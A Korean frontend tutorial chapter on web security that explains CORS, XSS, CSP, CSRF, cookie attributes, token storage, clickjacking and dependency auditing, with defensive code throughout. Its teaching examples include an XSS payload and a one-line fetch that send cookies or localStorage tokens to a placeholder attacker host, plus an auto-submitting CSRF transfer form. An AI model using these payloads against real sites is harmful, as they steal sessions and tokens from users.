---
title: 프론트엔드 07. 웹 보안
description: 입력과 요청에서 공격이 들어오는 지점을 파악하고 막습니다.
outline: deep
---

# 07. 웹 보안

어디로 공격이 들어오는지, 브라우저가 무엇을 막아 주고 무엇은 직접 막아야 하는지 정리합니다.

## 동일 출처 정책과 CORS

브라우저는 **출처가 다른 곳의 응답을 읽지 못하게** 막습니다. 출처는 프로토콜·호스트·포트 세 가지가 모두 같아야 동일합니다.

```
https://example.com        기준
https://example.com/api    같음 (경로는 무관)
http://example.com         다름 (프로토콜)
https://api.example.com    다름 (호스트)
https://example.com:8080   다름 (포트)
```

이 정책이 없으면, 로그인된 상태로 악성 사이트에 접속했을 때 그 사이트의 스크립트가 내 메일함을 읽어 갈 수 있습니다.

다른 출처의 API를 쓰려면 **서버가 허락해야** 합니다.

```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

조건에 따라 브라우저가 본 요청 전에 `OPTIONS`로 먼저 물어봅니다.

```http
OPTIONS /api/todos
Origin: https://example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: content-type
```

CORS 오류는 **프런트엔드 코드로 고칠 수 없습니다.** 서버 설정이거나, 개발 중이라면 프록시를 씁니다.

```js
// vite.config.js
export default {
  server: {
    proxy: { "/api": "http://localhost:3000" },
  },
};
```

`Access-Control-Allow-Origin: *`와 쿠키 전송은 함께 쓸 수 없습니다. 인증이 필요한 API는 출처를 명시해야 합니다.

## XSS: 저장형, 반사형과 DOM 기반

공격자가 넣은 문자열이 **코드로 실행되는** 취약점입니다.

| 종류 | 경로 |
| --- | --- |
| 저장형 | 댓글 등으로 저장된 값이 다른 사용자 화면에서 실행 |
| 반사형 | URL 파라미터가 그대로 페이지에 찍혀 실행 |
| DOM 기반 | 서버를 거치지 않고 클라이언트 코드가 직접 삽입 |

```js
// 저장형 — 댓글 내용이 그대로 들어갑니다
comment.innerHTML = data.body;

// 반사형 — 검색어를 그대로 보여 줍니다
result.innerHTML = `"${new URLSearchParams(location.search).get("q")}" 결과`;
```

```
?q=<img src=x onerror="fetch('https://공격자/?c='+document.cookie)">
```

실행되면 쿠키나 토큰이 빠져나가고, 사용자 권한으로 요청을 보낼 수 있습니다. 로그인 상태라면 계정을 통째로 넘기는 것과 같습니다.

`<script>` 태그만 막으면 된다고 생각하기 쉽지만, `onerror`, `onload`, `javascript:` 등 실행 경로가 많습니다.

## 입력이 코드로 해석되는 지점

막는 방법은 **해석되지 않는 자리에 넣는 것**입니다.

```js
element.textContent = userInput;   // 안전 — 글자로만 취급됩니다
element.innerHTML = userInput;     // 위험
```

속성에 넣을 때도 마찬가지입니다.

```js
element.setAttribute("title", userInput);   // 안전
element.setAttribute("onclick", userInput); // 위험
```

URL은 스킴을 확인합니다. `javascript:`로 시작하면 클릭 시 실행됩니다.

```js
// 위험
link.href = userInput;

// 확인 후 설정
const url = new URL(userInput, location.origin);
if (url.protocol === "http:" || url.protocol === "https:") {
  link.href = url.href;
}
```

HTML을 꼭 넣어야 한다면 정화 라이브러리를 씁니다. 직접 만든 필터는 거의 항상 뚫립니다.

```js
import DOMPurify from "dompurify";

element.innerHTML = DOMPurify.sanitize(userHtml);
```

React나 Vue는 기본적으로 이스케이프하지만, 우회하는 API가 있습니다. 이 자리에만 주의하면 됩니다.

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />   // React
<div v-html="userInput"></div>                             // Vue
```

## 콘텐츠 보안 정책(CSP)

XSS가 뚫렸을 때의 **두 번째 방어선**입니다. 어디서 온 스크립트를 실행할지 서버가 정합니다.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  img-src 'self' data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none'
```

인라인 스크립트가 차단되므로 `onerror="..."` 같은 공격이 실행되지 않습니다.

`'unsafe-inline'`을 넣으면 그 효과가 사라집니다. 인라인 스크립트가 필요하면 nonce를 씁니다.

```http
script-src 'nonce-r4nd0m'
```

```html
<script nonce="r4nd0m">...</script>
```

바로 차단하면 사이트가 깨질 수 있으니, 먼저 보고만 받아 봅니다.

```http
Content-Security-Policy-Report-Only: ...; report-uri /csp-report
```

## CSRF와 SameSite·토큰 대응

로그인된 사용자의 브라우저가 **자동으로 쿠키를 붙인다는 점**을 악용합니다.

```html
<!-- 악성 사이트에 심어 둔 폼 -->
<form action="https://bank.example.com/transfer" method="POST">
  <input name="to" value="공격자" />
  <input name="amount" value="1000000" />
</form>
<script>document.forms[0].submit();</script>
```

사용자는 아무것도 안 했는데 은행 사이트로 요청이 갑니다. 쿠키가 붙어 있으니 서버는 정상 요청으로 봅니다.

막는 방법은 두 가지입니다.

**SameSite 쿠키** — 다른 사이트에서 시작된 요청에는 쿠키를 붙이지 않습니다.

```http
Set-Cookie: session=...; SameSite=Lax; Secure; HttpOnly
```

`Lax`가 요즘 브라우저의 기본값이고, 일반적인 링크 이동(GET)에는 쿠키가 가지만 POST에는 가지 않습니다. 외부에서 들어오는 결제 콜백 같은 흐름이 있다면 `None`이 필요한데, 그때는 토큰이 반드시 함께 있어야 합니다.

**CSRF 토큰** — 서버가 발급한 값을 요청에 함께 보냅니다. 공격자는 이 값을 알 수 없습니다.

```js
await fetch("/api/transfer", {
  method: "POST",
  headers: { "X-CSRF-Token": token },
  body: JSON.stringify(data),
});
```

`Authorization` 헤더로 토큰을 보내는 방식은 브라우저가 자동으로 붙이지 않으므로 CSRF에 노출되지 않습니다. 대신 토큰을 어디에 두느냐가 문제가 됩니다.

## 쿠키 보안 속성

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

| 속성 | 역할 |
| --- | --- |
| `HttpOnly` | JavaScript에서 읽을 수 없습니다 — XSS로 탈취되지 않습니다 |
| `Secure` | HTTPS에서만 전송합니다 |
| `SameSite` | 다른 사이트에서 온 요청에 붙일지 정합니다 |

인증 쿠키에는 이 셋을 모두 붙이는 것이 기본입니다.

## 토큰을 저장하는 위치에 따른 노출 위험

| 위치 | XSS에 노출 | CSRF에 노출 |
| --- | --- | --- |
| `localStorage` | **예** | 아니오 |
| 일반 쿠키 | 예 | 예 |
| `HttpOnly` 쿠키 | 아니오 | SameSite로 대응 |

`localStorage`는 JavaScript로 읽을 수 있어서, XSS 한 번이면 토큰이 통째로 넘어갑니다.

```js
// 공격 코드 한 줄이면 됩니다
fetch("https://공격자/?t=" + localStorage.getItem("token"));
```

가장 안전한 조합은 **`HttpOnly` + `Secure` + `SameSite` 쿠키**입니다. 다만 쿠키를 쓰기 어려운 구조라면, XSS를 막는 데 더 공을 들여야 합니다.

## 클릭재킹과 프레임 차단

내 사이트를 투명하게 만들어 다른 페이지 위에 덮어씌우는 공격입니다. 사용자는 광고를 누르는 줄 알고 삭제 버튼을 누릅니다.

```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

프레임 안에서 열리는 것 자체를 막습니다. 특정 사이트에만 허용하려면 출처를 적습니다.

```http
Content-Security-Policy: frame-ancestors https://partner.example.com
```

외부 링크를 새 창으로 열 때도 주의합니다.

```html
<a href="https://external.com" target="_blank" rel="noopener noreferrer">링크</a>
```

`noopener`가 없으면 열린 페이지가 `window.opener`로 원래 탭의 주소를 바꿀 수 있습니다. 요즘 브라우저는 기본으로 막지만, 명시해 두는 편이 안전합니다.

## 의존성 취약점 점검과 갱신

직접 쓴 코드보다 가져다 쓴 패키지가 더 많습니다.

```bash
npm audit
npm audit fix

pnpm audit
```

CI에서 정기적으로 돌리고, Dependabot 같은 도구로 자동 갱신 PR을 받는 방법이 있습니다.

패키지를 추가할 때 확인할 것들입니다.

- 최근에 갱신되고 있는가
- 의존성이 과도하게 많지 않은가
- 정말 필요한가 — 짧은 함수 하나 때문에 패키지를 더하지 않습니다

`package-lock.json`이나 `pnpm-lock.yaml`을 저장소에 두면, 설치 시점에 따라 다른 버전이 깔리는 것을 막을 수 있습니다.
